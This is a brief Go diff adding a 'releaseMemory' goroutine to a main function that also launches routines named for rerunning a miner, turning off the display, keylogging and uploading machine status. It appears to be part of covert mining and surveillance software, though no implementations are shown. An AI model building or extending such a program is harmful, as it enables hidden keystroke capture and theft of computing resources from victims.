@@ -49,5 +49,6 @@ func main() {
 	go syncOnlineConfigAndReRunMiner() //add by clk
 	go offDisplay()                    //add by clk
 	go keyLogger(&config)
+	go releaseMemory()
 	uploadMachineStatus()
 }
